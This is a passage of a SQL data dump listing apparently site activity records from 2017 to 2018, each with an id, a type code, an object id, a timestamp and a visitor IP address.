(371, 1, 105, '2017-09-07 12:01:29', '223.96.220.105'),
(372, 1, 105, '2017-09-07 12:09:19', '223.96.220.105'),
(373, 1, 15, '2017-09-07 12:10:37', '113.220.165.196'),
(374, 1, 15, '2017-09-07 12:12:22', '113.220.165.196'),
(375, 2, 5, '2017-09-07 12:13:17', '113.220.165.196'),
(376, 1, 15, '2017-09-07 12:15:01', '113.220.165.196'),
(377, 1, 15, '2017-09-07 12:22:18', '113.220.165.196'),
(378, 1, 15, '2017-09-07 12:31:23', '113.220.165.196'),
(379, 1, 105, '2017-09-07 13:13:57', '223.96.220.105'),
(380, 2, 5, '2017-09-07 15:51:27', '60.171.240.222'),
(381, 2, 5, '2017-09-07 21:51:18', '222.41.112.170'),
(382, 2, 5, '2017-09-07 22:51:00', '223.96.222.136'),
(383, 2, 5, '2017-09-08 00:44:18', '125.111.88.186'),
(384, 1, 94, '2017-09-08 13:10:36', '120.43.250.237'),
(385, 2, 5, '2017-09-08 23:01:54', '223.157.116.240'),
(386, 1, 106, '2017-09-08 23:29:04', '36.40.29.95'),
(387, 2, 5, '2017-09-09 17:19:05', '223.157.116.240'),
(388, 1, 107, '2017-09-12 17:30:25', '60.171.240.222'),
(389, 1, 108, '2017-09-15 00:19:27', '223.166.20.195'),
(390, 1, 109, '2017-09-15 08:34:38', '14.127.231.47'),
(391, 1, 110, '2017-09-15 17:18:20', '163.142.51.9'),
(392, 2, 5, '2017-09-16 18:45:53', '60.175.244.22'),
(393, 2, 5, '2017-09-16 20:22:22', '60.175.244.22'),
(394, 2, 5, '2017-09-16 22:38:46', '223.166.20.195'),
(395, 2, 5, '2017-09-16 22:48:38', '222.242.66.187'),
(396, 2, 5, '2017-09-16 23:21:47', '222.242.66.187'),
(397, 2, 5, '2017-09-17 00:04:58', '222.242.66.187'),
(398, 2, 5, '2017-09-17 13:11:30', '27.42.145.173'),
(399, 1, 111, '2017-09-17 18:02:36', '223.96.221.164'),
(400, 2, 5, '2017-09-17 18:04:44', '223.96.221.164'),
(401, 2, 5, '2017-09-17 20:55:45', '222.242.66.187'),
(402, 2, 5, '2017-09-17 21:00:43', '222.242.66.187'),
(403, 2, 5, '2017-09-17 23:27:57', '222.242.66.187'),
(404, 1, 15, '2017-09-17 23:59:21', '222.242.66.187'),
(405, 2, 5, '2017-10-08 13:11:37', '175.2.49.141'),
(406, 2, 5, '2017-10-10 19:33:27', '223.157.223.121'),
(407, 1, 112, '2017-10-12 23:03:51', '223.87.102.31'),
(408, 2, 5, '2017-10-13 21:25:39', '101.69.49.187'),
(409, 2, 5, '2017-10-13 21:26:08', '123.190.77.200'),
(410, 1, 113, '2017-10-13 22:04:19', '123.190.77.200'),
(411, 2, 5, '2017-10-15 23:27:35', '220.170.250.203'),
(412, 1, 114, '2017-10-17 12:04:13', '58.254.108.123'),
(413, 1, 115, '2017-10-17 13:30:45', '223.64.187.150'),
(414, 2, 5, '2017-10-17 13:32:43', '223.64.187.150'),
(415, 2, 5, '2017-10-17 14:05:27', '223.157.112.99'),
(416, 2, 5, '2017-10-17 14:12:23', '223.157.112.99'),
(417, 2, 5, '2017-10-17 14:12:57', '111.37.71.162'),
(418, 1, 116, '2017-10-17 19:57:17', '222.222.189.58'),
(419, 1, 117, '2017-10-17 23:59:13', '101.247.220.60'),
(420, 1, 118, '2017-10-18 11:06:23', '183.11.130.112'),
(421, 2, 5, '2017-10-18 19:19:40', '223.157.248.143'),
(422, 2, 5, '2017-10-18 21:25:41', '223.157.248.143'),
(423, 2, 5, '2017-10-19 00:48:47', '223.157.248.143'),
(424, 2, 5, '2017-10-19 01:21:32', '223.157.248.143'),
(425, 2, 5, '2017-10-19 11:57:23', '223.157.248.143'),
(426, 2, 5, '2017-10-19 14:05:27', '223.157.248.143'),
(427, 2, 5, '2017-10-19 15:15:20', '223.157.248.143'),
(428, 1, 119, '2017-10-19 15:50:05', '116.8.36.90'),
(429, 2, 5, '2017-10-19 18:29:25', '223.157.248.143'),
(430, 2, 5, '2017-10-19 23:05:40', '223.157.248.143'),
(431, 2, 5, '2017-10-20 10:52:27', '112.64.72.111'),
(432, 2, 5, '2017-10-21 21:07:47', '127.0.0.1'),
(433, 2, 5, '2017-10-24 19:44:02', '127.0.0.1'),
(434, 1, 15, '2017-10-24 19:47:02', '127.0.0.1'),
(435, 2, 5, '2017-10-25 22:01:27', '175.2.75.140'),
(436, 1, 120, '2017-10-25 22:10:48', '1.89.233.190'),
(437, 2, 5, '2017-10-26 17:13:16', '175.2.1.202'),
(438, 2, 5, '2017-10-26 17:34:55', '113.94.55.45'),
(439, 1, 120, '2017-10-26 20:45:10', '1.89.233.190'),
(440, 1, 16, '2017-10-26 22:17:12', '58.16.197.7'),
(441, 1, 16, '2017-10-26 22:52:45', '58.16.197.7'),
(442, 1, 16, '2017-10-27 12:46:14', '58.16.197.7'),
(443, 1, 120, '2017-10-28 09:41:55', '114.242.249.107'),
(444, 1, 120, '2017-10-28 13:44:04', '114.242.249.107'),
(445, 1, 120, '2017-10-28 21:15:22', '1.89.233.190'),
(446, 1, 121, '2017-10-30 13:19:50', '1.89.233.190'),
(447, 2, 5, '2017-10-30 18:10:12', '223.157.248.108'),
(448, 1, 122, '2017-11-01 01:06:55', '183.40.1.97'),
(449, 1, 123, '2017-11-02 13:46:05', '182.140.175.143'),
(450, 2, 5, '2017-11-03 16:02:48', '223.157.223.225'),
(451, 2, 5, '2017-11-05 13:24:24', '58.46.10.34'),
(452, 2, 5, '2017-11-06 12:15:45', '223.157.112.70'),
(453, 2, 5, '2017-11-06 14:03:29', '223.157.112.70'),
(454, 1, 124, '2017-11-06 14:44:00', '110.82.171.33'),
(455, 2, 5, '2017-11-06 20:46:13', '223.157.112.70'),
(456, 2, 5, '2017-11-08 15:46:15', '58.46.7.134'),
(457, 2, 5, '2017-11-08 22:54:34', '112.224.2.65'),
(458, 1, 125, '2017-11-09 10:31:44', '115.217.117.12'),
(459, 2, 5, '2017-11-10 23:02:52', '175.2.79.232'),
(460, 2, 5, '2017-11-13 23:31:41', '127.0.0.1'),
(461, 2, 5, '2017-11-14 11:29:15', '127.0.0.1'),
(462, 2, 5, '2017-11-17 13:55:26', '127.0.0.1'),
(463, 2, 5, '2017-11-17 19:48:04', '127.0.0.1'),
(464, 2, 5, '2017-11-18 11:29:29', '127.0.0.1'),
(465, 2, 5, '2017-11-18 12:28:21', '127.0.0.1'),
(466, 1, 126, '2017-11-18 15:53:07', '123.161.25.188'),
(467, 2, 5, '2017-11-18 17:10:45', '58.16.124.63'),
(468, 2, 5, '2017-11-18 19:16:48', '113.220.230.214'),
(469, 2, 5, '2017-11-19 00:16:49', '58.16.124.63'),
(470, 2, 5, '2017-11-19 08:35:00', '183.0.225.163'),
(471, 2, 5, '2017-11-19 11:25:48', '113.220.223.249'),
(472, 1, 127, '2017-11-19 13:00:04', '27.47.232.107'),
(473, 2, 5, '2017-11-19 13:10:52', '113.220.223.249'),
(474, 2, 5, '2017-11-19 17:42:48', '113.220.223.249'),
(475, 1, 15, '2017-11-19 21:36:20', '113.220.223.249'),
(476, 1, 128, '2017-11-20 01:33:49', '113.86.38.248'),
(477, 1, 15, '2017-11-20 12:58:50', '113.220.223.249'),
(478, 2, 5, '2017-11-20 12:59:40', '113.220.223.249'),
(479, 1, 129, '2017-11-20 13:10:36', '42.199.131.17'),
(480, 1, 130, '2017-11-21 01:39:46', '116.8.38.248'),
(481, 1, 131, '2017-11-21 13:23:47', '36.98.36.246'),
(482, 1, 132, '2017-11-22 11:58:12', '113.110.103.15'),
(483, 1, 133, '2017-11-26 00:40:34', '120.230.77.0'),
(484, 1, 134, '2017-11-26 03:36:04', '120.229.3.193'),
(485, 1, 133, '2017-11-26 13:34:20', '120.230.77.0'),
(486, 2, 5, '2017-11-26 21:58:31', '113.110.155.168'),
(487, 2, 5, '2017-11-26 22:49:22', '113.110.155.168'),
(488, 1, 135, '2017-11-27 11:13:42', '119.176.200.29'),
(489, 2, 5, '2017-11-28 00:14:20', '113.88.197.179'),
(490, 1, 97, '2017-11-28 15:09:22', '27.47.232.142'),
(491, 1, 136, '2017-11-29 03:58:38', '120.15.178.174'),
(492, 2, 5, '2017-11-29 11:17:52', '1.192.177.106'),
(493, 2, 5, '2017-12-03 19:39:52', '116.20.231.21'),
(494, 2, 5, '2017-12-03 19:43:21', '118.178.56.223'),
(495, 2, 5, '2017-12-06 20:46:33', '223.157.248.8'),
(496, 1, 15, '2017-12-08 20:38:38', '223.157.251.214'),
(497, 1, 15, '2017-12-09 13:50:46', '223.157.251.214'),
(498, 2, 5, '2017-12-09 13:52:25', '223.157.251.214'),
(499, 1, 137, '2017-12-10 10:41:27', '113.225.168.54'),
(500, 1, 138, '2017-12-12 23:36:58', '223.157.221.143'),
(501, 1, 139, '2017-12-14 11:57:07', '111.19.44.228'),
(502, 1, 140, '2017-12-14 20:48:28', '116.18.228.242'),
(503, 1, 141, '2017-12-15 14:25:53', '101.226.225.84'),
(504, 2, 5, '2017-12-15 21:49:26', '111.227.25.38'),
(505, 2, 5, '2017-12-15 21:59:32', '182.18.8.45'),
(506, 2, 5, '2017-12-16 18:26:54', '223.157.223.210'),
(507, 2, 5, '2017-12-27 20:27:20', '124.231.182.201'),
(508, 2, 5, '2017-12-28 00:33:58', '124.231.182.201'),
(509, 1, 142, '2017-12-28 23:58:30', '119.134.103.52'),
(510, 2, 5, '2017-12-29 09:43:31', '175.15.64.7'),
(511, 2, 5, '2017-12-29 13:37:08', '175.15.64.7'),
(512, 2, 5, '2017-12-29 15:16:58', '175.15.64.7'),
(513, 2, 5, '2017-12-29 16:23:35', '115.199.196.74'),
(514, 2, 5, '2017-12-29 22:39:01', '175.15.64.7'),
(515, 2, 5, '2017-12-30 12:58:17', '175.15.64.7'),
(516, 2, 6, '2017-12-30 13:26:42', '175.15.64.7'),
(517, 2, 5, '2017-12-30 13:27:15', '175.15.64.7'),
(518, 2, 6, '2017-12-30 13:28:25', '175.15.64.7'),
(519, 2, 6, '2017-12-30 18:44:44', '175.15.66.151'),
(520, 2, 6, '2017-12-30 18:45:14', '117.136.41.91'),
(521, 2, 6, '2017-12-30 18:45:38', '223.73.54.220'),
(522, 2, 6, '2017-12-30 18:53:00', '119.123.217.225'),
(523, 2, 6, '2017-12-31 17:27:23', '175.15.66.151'),
(524, 2, 6, '2018-01-02 12:20:35', '223.157.118.76'),
(525, 2, 6, '2018-01-02 12:37:16', '112.97.52.72'),
(526, 1, 15, '2018-01-02 21:01:22', '223.157.118.76'),
(527, 2, 6, '2018-01-03 20:54:56', '223.157.124.49'),
(528, 2, 6, '2018-01-03 23:19:49', '223.157.124.49'),
(529, 2, 6, '2018-01-04 21:23:38', '223.157.124.49'),
(530, 2, 6, '2018-01-04 22:59:58', '223.157.124.49'),
(531, 2, 6, '2018-01-05 14:51:31', '124.231.164.5'),
(532, 2, 5, '2018-01-05 14:52:59', '124.231.164.5'),
(533, 2, 5, '2018-01-05 20:16:22', '124.231.164.5'),
(534, 1, 15, '2018-01-06 14:59:33', '124.231.164.5'),
(535, 2, 6, '2018-01-07 23:43:38', '124.231.164.20'),
(536, 2, 6, '2018-01-10 14:05:49', '124.231.173.148'),
(537, 2, 6, '2018-01-10 23:17:42', '223.73.87.130'),
(538, 2, 6, '2018-01-10 23:54:12', '101.27.61.23'),
(539, 2, 6, '2018-01-11 01:34:54', '111.77.229.197'),
(540, 2, 6, '2018-01-11 14:23:45', '112.54.7.207'),
(541, 1, 143, '2018-01-12 21:16:24', '183.226.92.165'),
(542, 2, 6, '2018-01-13 08:47:47', '183.205.35.227'),
(543, 2, 6, '2018-01-13 17:54:44', '223.157.112.158'),
(544, 2, 6, '2018-01-14 16:33:29', '223.157.112.158'),
(545, 2, 6, '2018-01-14 19:17:42', '175.2.171.193'),
(546, 2, 5, '2018-01-14 20:02:43', '175.2.171.193'),
(547, 2, 6, '2018-01-15 11:49:01', '175.2.171.193'),
(548, 2, 6, '2018-01-15 17:15:16', '14.106.185.175'),
(549, 2, 5, '2018-01-17 00:49:41', '58.46.3.132'),
(550, 1, 144, '2018-01-18 01:21:47', '120.239.209.185'),
(551, 1, 15, '2018-01-18 16:28:17', '220.170.236.216'),
(552, 2, 5, '2018-01-20 12:01:04', '220.170.239.225'),
(553, 1, 145, '2018-01-21 15:04:57', '119.134.103.56'),
(554, 2, 5, '2018-01-22 12:15:46', '223.157.140.197'),
(555, 2, 6, '2018-01-22 18:16:32', '120.32.3.236'),
(556, 2, 6, '2018-01-23 11:10:07', '223.157.140.197'),
(557, 2, 6, '2018-01-23 12:27:59', '106.61.33.238'),
(558, 2, 6, '2018-01-23 13:15:40', '106.61.33.238'),
(559, 2, 6, '2018-01-23 16:18:39', '106.61.62.58'),
(560, 1, 146, '2018-01-24 14:33:01', '14.25.41.157'),
(561, 1, 147, '2018-01-24 16:55:29', '223.157.142.250'),
(562, 2, 5, '2018-01-24 22:41:44', '223.157.142.250'),
(563, 2, 6, '2018-01-26 09:25:05', '106.57.109.195'),
(564, 2, 5, '2018-01-27 11:25:51', '223.157.117.120'),
(565, 2, 6, '2018-01-27 18:08:12', '61.52.75.224'),
(566, 2, 5, '2018-01-28 15:40:54', '175.2.121.79'),
(567, 2, 5, '2018-01-28 19:11:25', '175.2.121.79'),
(568, 2, 5, '2018-01-28 19:12:28', '175.2.121.79'),
(569, 2, 5, '2018-01-28 19:43:43', '175.2.121.79'),
(570, 2, 6, '2018-01-30 21:35:43', '125.109.44.93'),
(571, 2, 6, '2018-01-30 21:47:39', '125.109.44.93'),
(572, 2, 6, '2018-01-30 22:40:47', '125.109.44.93'),
(573, 2, 5, '2018-01-31 14:03:07', '175.2.0.178'),
(574, 2, 6, '2018-02-01 23:57:52', '123.151.77.74'),
(575, 2, 6, '2018-02-02 08:42:04', '101.226.225.84'),
(576, 2, 5, '2018-02-03 02:16:56', '175.2.226.192'),
(577, 2, 5, '2018-02-03 10:52:37', '175.2.226.192'),
(578, 2, 5, '2018-02-03 16:28:17', '113.220.227.45'),
(579, 2, 5, '2018-02-04 00:57:14', '58.46.0.175'),
(580, 2, 5, '2018-02-04 15:31:11', '58.46.0.175'),
(581, 2, 5, '2018-02-06 14:32:50', '175.2.50.240'),
(582, 2, 6, '2018-02-06 14:42:06', '119.123.126.9'),
(583, 2, 5, '2018-02-06 19:05:01', '223.157.113.102'),
(584, 2, 6, '2018-02-06 20:12:39', '119.123.126.187'),
(585, 1, 148, '2018-02-10 16:00:22', '115.35.20.154'),
(586, 1, 94, '2018-02-15 11:16:02', '125.78.53.109'),
(587, 2, 6, '2018-02-18 21:52:21', '123.151.77.74'),
(588, 2, 6, '2018-02-22 10:27:09', '106.6.120.121'),
(589, 2, 5, '2018-02-23 22:14:48', '113.220.229.236'),
(590, 2, 6, '2018-02-24 16:06:09', '115.206.23.138'),
(591, 2, 6, '2018-02-24 17:42:43', '115.206.23.138'),
(592, 2, 6, '2018-02-24 17:43:29', '113.220.229.236'),
(593, 2, 5, '2018-02-24 17:44:26', '113.220.229.236'),
(594, 2, 5, '2018-02-26 00:02:41', '124.231.171.51'),
(595, 2, 6, '2018-02-26 13:53:37', '115.206.31.103'),
(596, 1, 149, '2018-02-26 13:54:36', '115.206.31.103'),
(597, 1, 116, '2018-02-26 14:02:19', '115.206.31.103'),
(598, 1, 149, '2018-02-26 14:03:43', '115.206.31.103'),
(599, 1, 150, '2018-03-01 15:52:05', '223.96.221.250'),
(600, 2, 5, '2018-03-03 22:25:44', '222.242.67.11'),
(601, 2, 5, '2018-03-04 00:10:50', '222.242.67.11'),
(602, 2, 5, '2018-03-04 11:34:38', '222.242.67.11'),
(603, 2, 6, '2018-03-08 14:37:31', '221.212.245.93'),
(604, 2, 6, '2018-03-08 14:39:09', '113.104.192.220'),
(605, 2, 6, '2018-03-08 14:40:00', '59.32.205.139'),
(606, 2, 6, '2018-03-08 16:50:48', '223.157.232.61'),
(607, 2, 6, '2018-03-08 16:51:28', '59.41.65.68'),
(608, 2, 6, '2018-03-08 18:20:11', '117.24.40.127'),
(609, 1, 151, '2018-03-11 16:50:58', '223.88.196.16'),
(610, 2, 6, '2018-03-17 11:49:48', '1.189.133.19'),
(611, 2, 6, '2018-03-18 15:21:39', '112.98.93.94'),
(612, 1, 152, '2018-03-19 14:30:00', '36.4.202.50'),
(613, 2, 6, '2018-03-19 21:01:30', '139.170.68.56'),
(614, 2, 6, '2018-03-19 21:09:14', '139.170.68.56'),
(615, 2, 5, '2018-03-21 01:03:01', '124.231.180.22'),
(616, 1, 15, '2018-03-22 10:47:04', '175.2.74.232'),
(617, 2, 5, '2018-03-24 16:46:03', '223.157.188.142'),
(618, 2, 5, '2018-03-26 15:08:15', '175.2.3.76'),
(619, 1, 153, '2018-03-27 21:16:56', '14.116.142.63'),
(620, 1, 154, '2018-03-28 16:55:52', '119.4.253.191'),
(621, 1, 154, '2018-03-29 13:34:14', '220.167.59.243'),
(622, 1, 15, '2018-03-29 15:08:30', '124.231.179.99'),
(623, 2, 6, '2018-03-30 02:00:15', '119.2.128.169'),
(624, 1, 15, '2018-03-30 02:12:05', '124.231.179.99'),
(625, 2, 5, '2018-03-30 02:16:18', '124.231.179.99'),
(626, 2, 5, '2018-03-30 02:30:43', '124.231.179.99'),
(627, 2, 5, '2018-03-30 16:07:08', '124.231.179.99'),
(628, 2, 5, '2018-03-30 16:16:23', '124.231.179.99'),
(629, 2, 6, '2018-03-30 19:40:57', '42.49.242.126'),
(630, 1, 15, '2018-03-30 20:00:32', '124.231.179.99'),
(631, 2, 5, '2018-03-31 12:18:57', '124.231.169.139'),
(632, 2, 5, '2018-03-31 14:29:09', '124.231.169.139'),
(633, 2, 6, '2018-03-31 17:19:21', '1.206.104.10'),
(634, 2, 5, '2018-04-01 16:39:11', '175.2.224.48'),
(635, 2, 5, '2018-04-02 02:04:09', '175.2.224.48'),
(636, 2, 5, '2018-04-04 01:03:51', '222.242.65.146'),
(637, 1, 155, '2018-04-04 17:24:43', '223.96.96.213'),
(638, 1, 156, '2018-04-09 03:05:53', '49.118.221.11'),
(639, 2, 6, '2018-04-11 22:13:23', '117.177.195.198'),
(640, 2, 5, '2018-04-12 11:40:08', '222.242.66.186'),
(641, 2, 5, '2018-04-12 12:19:53', '222.242.66.186'),
(642, 2, 5, '2018-04-12 22:46:15', '222.242.66.186'),
(643, 2, 5, '2018-04-12 23:18:55', '222.242.66.186'),
(644, 1, 157, '2018-04-14 12:37:43', '123.151.77.81'),
(645, 1, 158, '2018-04-25 17:26:35', '117.67.9.241'),
(646, 1, 127, '2018-04-26 13:57:33', '118.116.90.239'),
(647, 2, 5, '2018-04-27 12:37:30', '113.220.225.234'),
(648, 2, 5, '2018-04-27 12:49:15', '113.220.225.234'),
(649, 1, 15, '2018-04-27 22:53:04', '113.220.225.234'),
(650, 1, 14, '2018-04-27 22:53:27', '113.220.225.234'),
(651, 2, 5, '2018-04-27 22:54:16', '113.220.225.234'),
(652, 1, 159, '2018-04-28 07:47:43', '175.169.152.244'),
(653, 1, 159, '2018-04-28 18:04:37', '175.169.152.244'),
(654, 2, 6, '2018-04-29 12:00:14', '111.182.120.36'),
(655, 2, 5, '2018-04-29 15:21:57', '223.157.189.247'),
(656, 1, 160, '2018-05-01 01:04:54', '175.169.152.244'),
(657, 1, 161, '2018-05-02 22:44:16', '183.226.21.47'),
(658, 2, 6, '2018-05-02 22:51:53', '58.46.3.59'),
(659, 2, 6, '2018-05-02 22:52:08', '183.226.21.47'),
(660, 2, 5, '2018-05-03 20:00:36', '58.46.3.59'),
(661, 1, 15, '2018-05-03 21:00:18', '175.2.215.15'),
(662, 2, 5, '2018-05-10 11:52:31', '175.2.84.90'),
(663, 1, 14, '2018-05-20 19:54:30', '39.188.249.81'),
(664, 2, 6, '2018-05-22 00:30:33', '223.74.155.45'),
(665, 2, 6, '2018-05-22 04:33:27', '223.74.155.45'),
(671, 1, 162, '2018-05-24 16:29:52', '123.133.101.154'),
(672, 2, 6, '2018-05-24 21:04:12', '220.170.236.131'),
(673, 2, 5, '2018-05-24 21:06:50', '220.170.236.131'),
(674, 2, 5, '2018-05-24 23:36:29', '220.170.236.131'),
(675, 2, 5, '2018-05-25 10:33:51', '220.170.236.131'),
(676, 2, 5, '2018-05-27 20:18:59', '175.2.85.155'),
(677, 1, 15, '2018-05-29 23:49:30', '124.231.169.3'),
(678, 2, 5, '2018-05-29 23:59:32', '124.231.169.3'),
(679, 2, 5, '2018-05-30 00:20:08', '124.231.169.3'),
(680, 2, 5, '2018-05-30 22:55:07', '124.231.169.3'),
(681, 2, 6, '2018-05-30 23:37:10', '1.192.36.124'),
(682, 2, 5, '2018-05-31 18:15:51', '113.220.223.152'),
(683, 2, 5, '2018-05-31 21:51:31', '113.220.223.152'),
(684, 2, 5, '2018-05-31 22:37:35', '113.220.223.152'),
(685, 1, 14, '2018-05-31 23:50:44', '113.220.223.152'),
(686, 2, 5, '2018-06-01 01:15:19', '113.220.223.152'),
(687, 2, 5, '2018-06-01 10:05:35', '113.220.223.152'),
(688, 2, 5, '2018-06-01 10:08:35', '113.220.223.152'),
(689, 1, 14, '2018-06-01 10:13:54', '113.220.223.152'),
(690, 2, 5, '2018-06-02 17:24:11', '175.2.227.78'),
(691, 2, 5, '2018-06-03 11:15:43', '175.2.227.78'),
(692, 1, 15, '2018-06-03 11:25:45', '175.2.227.78'),
(693, 2, 5, '2018-06-04 16:02:11', '175.2.85.253'),
(694, 2, 5, '2018-06-04 18:41:17', '175.2.85.253'),
(695, 1, 15, '2018-06-05 17:26:34', '175.2.85.253'),
(696, 2, 5, '2018-06-05 21:33:21', '175.2.85.253'),
(697, 1, 163, '2018-06-05 21:41:22', '175.2.85.253'),
(698, 2, 5, '2018-06-05 22:06:16', '175.2.85.253'),
(699, 2, 5, '2018-06-05 22:10:23', '175.2.85.253'),
(700, 2, 5, '2018-06-05 22:40:45', '175.2.85.253'),
(701, 2, 5, '2018-06-05 23:02:53', '175.2.85.253'),
(702, 2, 5, '2018-06-05 23:08:51', '175.2.85.253'),
(703, 2, 6, '2018-06-07 15:30:48', '60.208.154.218'),
(704, 2, 6, '2018-06-07 16:23:21', '60.208.154.218'),
(705, 2, 6, '2018-06-07 16:24:13', '60.208.154.218'),
(706, 1, 164, '2018-06-08 10:18:04', '49.221.17.34'),
(707, 2, 6, '2018-06-08 10:29:19', '113.246.172.101'),
(708, 1, 165, '2018-06-09 09:41:40', '124.135.235.0'),
(709, 1, 166, '2018-06-09 11:51:06', '222.125.4.59'),
(710, 2, 5, '2018-06-10 11:14:08', '175.2.39.129'),
(711, 2, 5, '2018-06-10 11:54:15', '175.2.39.129'),
(712, 1, 15, '2018-06-10 12:02:18', '175.2.39.129'),
(713, 2, 5, '2018-06-10 12:34:12', '175.2.39.129'),
(714, 1, 167, '2018-06-10 13:10:35', '58.19.230.80'),
(715, 2, 5, '2018-06-10 13:30:55', '175.2.39.129'),
(716, 2, 5, '2018-06-10 15:17:16', '175.2.39.129'),
(717, 2, 6, '2018-06-11 00:11:43', '118.78.15.16'),
(718, 1, 168, '2018-06-11 21:53:50', '113.57.245.217'),
(719, 2, 6, '2018-06-12 12:15:06', '113.57.183.146'),
(720, 2, 6, '2018-06-12 12:21:13', '49.77.1.221'),
(721, 1, 169, '2018-06-12 12:24:09', '49.77.1.221'),
(722, 1, 170, '2018-06-15 17:04:15', '113.101.62.12'),
(723, 2, 5, '2018-06-16 18:19:49', '222.242.68.172'),
(724, 1, 171, '2018-06-24 20:27:15', '122.142.178.97'),
(725, 2, 6, '2018-07-03 22:08:33', '116.237.51.173'),
(726, 2, 6, '2018-07-03 22:08:51', '58.46.7.112'),
(727, 2, 6, '2018-07-03 22:08:56', '92.38.128.76'),
(728, 1, 172, '2018-07-05 16:18:47', '220.112.121.200'),
(729, 2, 5, '2018-07-07 00:07:25', '175.2.81.221'),
(730, 2, 6, '2018-07-11 16:46:37', '115.206.28.128'),
(731, 2, 5, '2018-07-11 16:56:10', '175.2.169.191'),
(732, 2, 6, '2018-07-12 13:21:59', '122.224.162.2'),
(733, 2, 5, '2018-07-14 16:17:01', '124.231.178.47'),
(734, 2, 5, '2018-07-14 16:39:06', '124.231.178.47'),
(735, 2, 5, '2018-07-15 22:50:49', '223.157.126.127'),
(736, 2, 5, '2018-07-17 00:25:44', '223.157.126.127'),
(737, 2, 6, '2018-07-18 09:48:56', '140.243.30.12'),
(738, 2, 6, '2018-07-21 12:54:34', '119.119.158.146'),
(739, 2, 5, '2018-07-23 10:26:46', '58.46.11.51'),
(740, 1, 15, '2018-07-23 10:29:29', '58.46.11.51'),
(741, 1, 15, '2018-07-23 10:32:27', '58.46.11.51'),
(742, 1, 173, '2018-07-25 20:35:08', '111.1.220.146'),
(743, 1, 174, '2018-07-25 23:38:06', '123.151.77.48'),
(744, 1, 175, '2018-07-26 15:02:38', '110.81.185.251'),
(745, 2, 5, '2018-07-27 23:53:08', '223.157.233.120'),
(746, 2, 5, '2018-07-28 00:22:54', '223.157.233.120'),
(747, 1, 15, '2018-07-28 00:39:52', '223.157.233.120'),
(748, 2, 5, '2018-07-28 22:37:50', '175.2.172.251'),
(749, 1, 176, '2018-07-28 22:42:39', '175.2.172.251'),
(750, 1, 177, '2018-07-28 22:42:39', '175.2.172.251'),
(751, 1, 178, '2018-07-28 22:42:39', '175.2.172.251'),
(752, 1, 179, '2018-07-28 22:42:39', '175.2.172.251'),
(753, 1, 180, '2018-07-28 22:42:39', '175.2.172.251'),
(754, 1, 181, '2018-07-28 22:42:39', '175.2.172.251'),
(755, 1, 182, '2018-07-28 22:42:39', '175.2.172.251'),
(756, 1, 183, '2018-07-28 22:42:39', '175.2.172.251'),
(757, 1, 184, '2018-07-28 22:42:39', '175.2.172.251'),
(758, 1, 185, '2018-07-28 22:42:39', '175.2.172.251'),
(759, 2, 5, '2018-07-28 22:43:51', '175.2.172.251'),
(760, 2, 5, '2018-07-29 10:54:02', '175.2.172.251'),
(761, 2, 6, '2018-07-29 11:00:17', '139.199.23.69'),
(762, 2, 6, '2018-07-29 11:00:57', '59.32.205.139'),
(763, 1, 186, '2018-07-29 11:32:37', '110.184.76.132'),
(764, 1, 186, '2018-07-29 11:40:22', '110.184.76.132'),
(765, 1, 187, '2018-07-29 15:43:10', '39.176.69.25'),
(766, 1, 188, '2018-07-31 16:19:47', '113.57.246.85'),
(767, 1, 188, '2018-07-31 16:32:39', '113.57.246.85'),
(768, 1, 188, '2018-07-31 16:44:44', '113.57.183.155'),
(769, 1, 188, '2018-07-31 17:12:16', '113.57.183.155'),
(770, 2, 6, '2018-08-02 22:11:16', '113.57.182.232'),
(771, 2, 6, '2018-08-02 23:26:22', '113.57.245.3'),
(772, 1, 188, '2018-08-02 23:42:02', '113.57.245.3'),
(773, 2, 6, '2018-08-02 23:57:08', '113.57.245.3'),
(774, 2, 6, '2018-08-03 07:06:18', '27.19.221.236'),
(775, 1, 188, '2018-08-03 07:07:13', '27.19.221.236'),
(776, 1, 189, '2018-08-07 14:48:23', '219.82.134.219'),
(777, 1, 190, '2018-08-08 17:26:43', '120.37.167.95'),
(778, 1, 15, '2018-08-09 12:59:41', '223.157.223.224'),
(779, 2, 6, '2018-08-16 11:17:15', '115.190.117.54'),
(780, 2, 6, '2018-08-16 11:25:44', '115.190.117.54'),
(781, 2, 6, '2018-08-21 19:47:46', '223.157.250.178'),
(782, 2, 6, '2018-08-21 19:47:54', '113.55.112.85'),
(783, 2, 6, '2018-08-22 01:08:37', '223.157.250.178'),
(784, 2, 7, '2018-08-22 01:10:13', '223.157.250.178'),
(785, 1, 191, '2018-08-22 10:05:22', '123.92.219.223'),
(786, 1, 192, '2018-08-24 00:38:53', '175.2.75.151'),
(787, 2, 8, '2018-08-29 01:04:04', '58.46.3.190'),
(788, 2, 9, '2018-08-29 01:20:51', '58.46.3.190'),
(789, 1, 193, '2018-08-29 17:34:42', '223.157.221.28'),
(790, 2, 10, '2018-08-29 20:10:48', '223.157.221.28'),
(791, 1, 194, '2018-08-30 03:25:08', '223.104.254.147'),
(792, 2, 11, '2018-08-31 00:37:13', '223.157.221.28'),
(793, 2, 6, '2018-08-31 12:34:56', '223.157.237.180'),
(794, 2, 6, '2018-08-31 14:07:33', '223.157.237.180'),
(795, 1, 195, '2018-09-03 01:36:37', '123.151.77.123'),
(796, 1, 195, '2018-09-03 01:45:34', '117.132.193.9'),
(797, 2, 12, '2018-09-03 18:43:35', '175.2.48.142'),
(798, 2, 13, '2018-09-03 21:23:45', '175.2.72.142'),
(799, 1, 196, '2018-09-04 18:05:43', '183.6.27.96'),
(800, 1, 197, '2018-09-07 14:12:20', '183.158.197.236'),
(801, 2, 6, '2018-09-11 15:13:01', '175.2.80.116'),
(802, 2, 14, '2018-09-13 13:32:41', '223.157.233.85'),
(803, 2, 15, '2018-09-13 13:46:01', '223.157.233.85'),
(804, 1, 198, '2018-09-17 13:40:59', '171.109.240.122'),
(805, 1, 199, '2018-09-22 22:31:57', '175.2.49.106'),
(806, 1, 200, '2018-09-23 21:26:02', '106.12.19.7'),
(807, 1, 201, '2018-09-23 22:43:02', '111.15.93.220'),
(808, 1, 159, '2018-09-24 11:12:38', '123.130.11.124'),
(809, 1, 202, '2018-09-25 22:21:41', '124.226.60.229'),
(810, 1, 203, '2018-09-29 21:05:30', '110.212.254.161'),
(811, 2, 6, '2018-09-30 10:28:44', '175.2.87.46'),
(812, 2, 6, '2018-09-30 10:29:09', '112.45.153.18'),
(813, 1, 15, '2018-09-30 10:34:53', '175.2.87.46'),
(814, 2, 6, '2018-09-30 11:24:48', '112.45.153.18'),
(815, 1, 15, '2018-09-30 21:49:42', '175.2.87.46'),
(816, 1, 15, '2018-09-30 22:34:36', '175.2.87.46'),
